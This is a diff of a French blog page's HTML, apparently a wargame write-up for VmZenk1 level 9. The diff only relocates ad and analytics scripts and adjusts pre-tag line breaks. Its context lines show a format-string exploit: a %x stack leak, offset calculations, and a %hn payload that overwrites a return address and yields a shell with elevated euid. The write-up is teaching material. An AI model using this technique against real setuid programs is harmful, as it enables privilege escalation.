@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2010/11/09/wargame-vmzenk1-level-9.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -154,7 +134,8 @@
  <span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>On lance gdb :</p>
 
@@ -269,7 +250,8 @@ Current language:  auto<span class="p">;</span> currently asm
 <span class="o">(</span>gdb<span class="o">)</span> x/10x <span class="nv">$esp</span><span class="nt">-16</span>
 0xbffff470: 0xbffff484 0xb7fd8ff4 0xbffff898 &lt;span <span class="nv">style</span><span class="o">=</span><span class="s2">"color: green;"</span><span class="o">&gt;</span>0x080484e9&lt;/span&gt;
 0xbffff480: 0xbffff494 0xbffffa44 0x00000400 0xbffff4a0
-0xbffff490: 0xbffff8b0 0x252e7825</pre></td></tr></tbody></table></code></pre></figure>
+0xbffff490: 0xbffff8b0 0x252e7825
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>On pose un breakpoint sur la ligne <span style="color: red;">0x080484f2</span> on retourne ensuite en <span style="color: orange;">0x080484f7</span> normalement.
 On dumpe et on doit re-écrire l’adresse de retour (en vert).</p>
@@ -289,7 +271,8 @@ On dumpe et on doit re-écrire l’adresse de retour (en vert).</p>
 Votre nom est : bffffa44.400.bffff4a0.bffff8b0.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
 
 Program exited normally.
-<span class="o">(</span>gdb<span class="o">)</span> quit</pre></td></tr></tbody></table></code></pre></figure>
+<span class="o">(</span>gdb<span class="o">)</span> quit
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>On peut calculer l’adresse où écrire grâce à la troisième valeur :
 offset pour avoir le début : 0xbffff4a0 - 0xbffff470 = 30
@@ -300,7 +283,8 @@ addresse où écrire : bffff470 + 0xc = bffff47c</p>
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>level9@VmAppliZenk:~<span class="nv">$ </span>./level9 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "%x." * 10'</span><span class="sb">`</span>
-Votre nom est : bfffaa30.400.bfffa490.bfffa8a0.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.</pre></td></tr></tbody></table></code></pre></figure>
+Votre nom est : bfffaa30.400.bfffa490.bfffa8a0.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Addresse où on doit écrire : 0xbfffa490 - 0x30 + c = 0xbfffa46c</p>
 
@@ -311,7 +295,8 @@ Votre nom est : bfffaa30.400.bfffa490.bfffa8a0.252e7825.78252e78.2e78252e.252e78
 3
 </pre></td><td class="code"><pre>level9@VmAppliZenk:~<span class="nv">$ </span>./level9 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x6c\xa4\xff\xbf" + "%55121x" + "%5$hn" + "\x6e\xa4\xff\xbf" + "%59558x" + "%9$hn"'</span><span class="sb">`</span>
 sh-3.2<span class="nv">$ </span><span class="nb">id
-</span><span class="nv">uid</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1010<span class="o">(</span>level10<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span>,1012<span class="o">(</span>challengers<span class="o">)</span></pre></td></tr></tbody></table></code></pre></figure>
+</span><span class="nv">uid</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1010<span class="o">(</span>level10<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span>,1012<span class="o">(</span>challengers<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Pawned,</p>
 
@@ -420,6 +405,26 @@ sh-3.2<span class="nv">$ </span><span class="nb">id
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
